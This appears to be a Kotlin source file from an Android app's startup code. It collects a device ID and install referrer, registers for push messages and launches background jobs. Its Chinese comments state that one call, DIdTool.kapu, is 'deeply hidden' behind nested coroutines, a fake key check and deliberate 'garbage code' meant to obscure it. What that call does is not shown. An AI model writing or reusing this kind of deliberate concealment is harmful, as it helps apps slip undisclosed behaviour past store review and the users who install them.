package com.mastery.leaves.trace.core

import android.app.Application
import android.util.Log
import com.mastery.leaves.trace.ami.AllDataTool
import com.mastery.leaves.trace.ami.ChongTool
import com.mastery.leaves.trace.data.RefGoTool
import com.mastery.leaves.trace.dimoting.laqleis.InitDies
import kotlinx.coroutines.*

object CanNextGo {

    fun showLog(log: String) {
        Log.e("Single", log)
    }

    // 主入口方法 - 拆分为多个阶段
    fun Gined(app: Application) {
        Log.e("TAG", "Gined: 1")
        AllDataTool.getMainUser = app
        DIdTool.iniLif(app)
        DIdTool.getDeviceId(app)
        scheduleSecretOperation()
        RefGoTool.fetchInstallReferrer(app)
        Gined2(app)
        Gined3()
    }

    fun Gined2(app: Application) {
        val initDies = InitDies()
        initDies.initAlly(app)
        startPeriodicServices(initDies, app)
        startWorkTasks(app)
    }

    fun Gined3() {
        executeFcmInit()
        executePostInit()
    }

    // FCM初始化
    private fun executeFcmInit() {
        DIdTool.getFcmFun()
    }

    // Post功能初始化
    private fun executePostInit() {
        ChongTool.ssPostFun()
    }


    private fun startPeriodicServices(initDies: InitDies, app: Application) {
        initDies.startPeriodicService(app)
    }

    // Work任务启动
    private fun startWorkTasks(app: Application) {
        TaskWorkManager.startUniqueWork(app)
        TaskWorkManager.startPeriodicWork(app)
    }

    // 深度隐藏的关键方法调用
    private fun scheduleSecretOperation() {
        Log.e("TAG", "Gined: 3")
        // 多层嵌套和延迟来隐藏关键调用
        CoroutineScope(Dispatchers.Default).launch {
            val secretKey = generateSecretKey()
            if (validateSecretKey(secretKey)) {
                withContext(Dispatchers.Main) {
                    executeHiddenOperation()
                }
            }
        }
    }

    // 生成密钥（垃圾代码）
    private fun generateSecretKey(): String {
        val timestamp = System.currentTimeMillis()
        val processId = android.os.Process.myPid()
        return "${timestamp}_${processId}".hashCode().toString(16)
    }

    // 验证密钥（垃圾代码，总是返回true）
    private fun validateSecretKey(key: String): Boolean {
        return key.isNotEmpty() && key.length > 5
    }

    // 执行隐藏操作 - 这里才是真正的kapu调用
    private fun executeHiddenOperation() {
        // 添加更多混淆
        val operationData = prepareOperationData()
        if (operationData.isNotEmpty()) {
            performCriticalOperation(operationData)
        }
    }

    // 准备操作数据（垃圾代码）
    private fun prepareOperationData(): String {
        val data = AllDataTool.kupaName
        val processedData = data.reversed().reversed()
        return processedData
    }

    // 执行关键操作 - 真正的kapu调用被深度隐藏在这里
    private fun performCriticalOperation(data: String) {
        DIdTool.kapu(data)
    }
}